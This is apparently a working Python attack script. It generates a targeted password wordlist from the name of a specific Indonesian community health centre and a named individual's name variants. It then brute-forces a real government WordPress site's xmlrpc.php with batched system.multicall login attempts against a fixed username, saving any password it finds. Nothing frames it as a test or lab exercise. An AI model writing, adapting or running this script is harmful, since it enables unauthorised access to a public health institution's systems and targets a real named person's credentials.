
import requests, sys, itertools

# 1. GENERATOR WORDLIST LENGKAP (50.000+ Password)
keywords = [
    # Original Keywords
    "puskesjaten", "puskesjaten1", "jaten", "puskesjaten1", "jaten",
    "puskes", "puskesmas", "pustu", "pustujaten", "pusjaten",
    "karanganyar", "kra", "karanganyarkab", "dinkes", "dinas",
    "kesehatan", "sehat", "puskbj1", "pkmjaten", "pkm",
    "admin", "operator", "bidan", "dokter", "perawat", "apoteker", "gawatdarurat",
    "kepala", "kapus", "ibu", "bu",
    
    # NEW: Specific Names
    "wiwied", "wiwid", "wied", "widyawati", "widya", "wiedy", "buwiwied", "ibuwiwied", "kapuswiwied", "drwiwied"
]
modifiers = ["01", "1", "123", "2024", "2025", "2026", "2020", "2021", "2022", "2023", "!", "@", "!!", "!!!"]
separators = ["", ".", "_", "@", "#", "-", "!"]

passwords = set()

def variants(word):
    return [word, word.upper(), word.capitalize()]

def leet(word):
    mapping = str.maketrans("aioesbg", "4103586")
    return word.translate(mapping)

print("[*] Generating 50.000+ targeted passwords including 'Wiwied' variations...")

# Phase 1: Simple combinations (Word + Mod)
for k in keywords:
    for v in variants(k):
        passwords.add(v)
        # Word + suffix (e.g., Wiwied2025)
        for m in modifiers:
            passwords.add(f"{v}{m}")
            passwords.add(f"{v}@{m}")
            passwords.add(f"{v}#{m}")
            passwords.add(f"{v}.{m}")
            passwords.add(f"{v}_{m}")
            passwords.add(f"{v}-{m}")
            passwords.add(f"{m}{v}")
            passwords.add(f"{m}@{v}")

# Phase 2: Word + Word combos (e.g., WiwiedWidyawati, WiwiedPuskes)
combo_keywords = [k for k in keywords if len(k) > 3] 
for c in itertools.permutations(combo_keywords, 2):
    w1, w2 = c
    
    # Only combine if one of the words is related to the person OR the place (to keep list size manageable but improved quality)
    person_related = any(x in w1 for x in ["wiwied", "widya", "wied"]) or any(x in w2 for x in ["wiwied", "widya", "wied"])
    
    if person_related or (w1 == "puskes" or w1 == "jaten" or w1 == "admin"):
        combined_c = f"{w1.capitalize()}{w2.capitalize()}" 
        combined_l = f"{w1}{w2}" 
        combined_u = f"{w1.upper()}{w2.upper()}" 
        
        for base in [combined_c, combined_l, combined_u]:
            passwords.add(base)
            for m in ["1", "123", "2024", "2025", "!"]:
                passwords.add(f"{base}{m}")
                passwords.add(f"{base}@{m}")
                passwords.add(f"{base}.{m}")

# Phase 3: Specific Full Name Permutations
full_names = [
    ("wiwied", "widyawati"),
    ("widyawati", "wiwied"),
    ("dr", "wiwied"),
    ("ibu", "wiwied"),
    ("bu", "wiwied")
]

for first, last in full_names:
    for v_first in variants(first):
        for v_last in variants(last):
            # wiwiedwidyawati
            passwords.add(f"{v_first}{v_last}")
            # wiwied.widyawati
            passwords.add(f"{v_first}.{v_last}")
            # wiwied_widyawati
            passwords.add(f"{v_first}_{v_last}")
            # wiwied-widyawati
            passwords.add(f"{v_first}-{v_last}")
            # wiwiedwidyawati123
            for m in ["1", "123", "2024", "2025", "!"]:
                passwords.add(f"{v_first}{v_last}{m}")
                passwords.add(f"{v_first}.{v_last}{m}")

# Phase 4: Leet speak variants
leet_passwords = set()
for p in passwords:
    if len(p) > 6:
        leet_p = leet(p.lower())
        if leet_p != p.lower():
            leet_passwords.add(leet_p.capitalize()) 
            leet_passwords.add(leet_p)

passwords.update(leet_passwords)

# Phase 5: Specific complex patterns based on new info
passwords.update([
    "Wiwied.Widyawati1!", "Wiwied_Widyawati#1", "Dr.WiwiedWidyawati",
    "KepalaPuskesJWiwied", "WiwiedPuskesJaten", "WiwiedJaten1",
    "Widyawati2025!", "Widyawati!2024"
])

wordlist = sorted(list(passwords), key=len)
print(f"[*] Total passwords generated: {len(wordlist)}")

# 2. XML-RPC BRUTEFORCER
url = "https://puskesjaten1.karanganyarkab.go.id/xmlrpc.php"
user = "puskesjaten1"
proxies = None 

print(f"[*] Target: {url}")
print(f"[*] User: {user}")
print("[*] Starting attack (500 passwords/request)...")

for i in range(0, len(wordlist), 500):
    batch = wordlist[i:i+500]
    # Construct payload manually for speed
    payload = "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
    for p in batch:
        payload += f"<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>{user}</string></value><value><string>{p}</string></value></data></array></value></member></struct></value>"
    payload += "</data></array></value></param></params></methodCall>"
    
    try:
        r = requests.post(url, data=payload, proxies=proxies, timeout=30, headers={"Content-Type":"text/xml", "User-Agent":"Mozilla/5.0"})
        if "isAdmin" in r.text:
            print(f"\n[!] HIT FOUND in batch {i}! Checking individually...")
            for p in batch:
                check = f"<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{user}</string></value></param><param><value><string>{p}</string></value></param></params></methodCall>"
                r2 = requests.post(url, data=check, proxies=proxies, timeout=10)
                if "isAdmin" in r2.text:
                    print(f"\n[+] PASSWORD FOUND: {p}")
                    # Save to file immediately
                    with open("FOUND_PASSWORD.txt", "w") as f: f.write(p)
                    sys.exit(0)
        print(f"\r[*] Tested {min(i+500, len(wordlist))}/{len(wordlist)}...", end="")
    except Exception as e:
        print(f"\n[!] Error: {e}")

print("\n[-] Attack finished. Password not found.")
